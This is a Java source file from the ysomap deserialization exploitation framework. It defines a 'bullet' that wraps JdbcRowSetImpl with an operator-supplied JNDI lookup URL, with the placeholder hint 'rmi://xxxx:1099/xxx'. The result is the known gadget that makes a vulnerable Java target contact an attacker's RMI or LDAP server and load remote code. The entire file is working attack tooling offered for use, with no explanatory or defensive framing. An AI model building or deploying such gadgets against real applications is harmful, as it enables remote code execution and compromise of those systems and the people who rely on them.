package ysomap.core.gadget.bullet.jdk;

import com.sun.rowset.JdbcRowSetImpl;
import ysomap.annotation.Bullets;
import ysomap.annotation.NotNull;
import ysomap.annotation.Require;
import ysomap.core.bean.Bullet;

/**
 * @author wh1t3P1g
 * @since 2020/3/2
 */
@Bullets
public class JdbcRowSetImplBullet extends Bullet<JdbcRowSetImpl> {

    @NotNull
    @Require(name = "jndiURL", detail = "jndi lookup url, like rmi://xxxx:1099/xxx")
    public String jndiURL;

    @Override
    public JdbcRowSetImpl getObject() throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(jndiURL);
        return jdbcRowSet;
    }
}
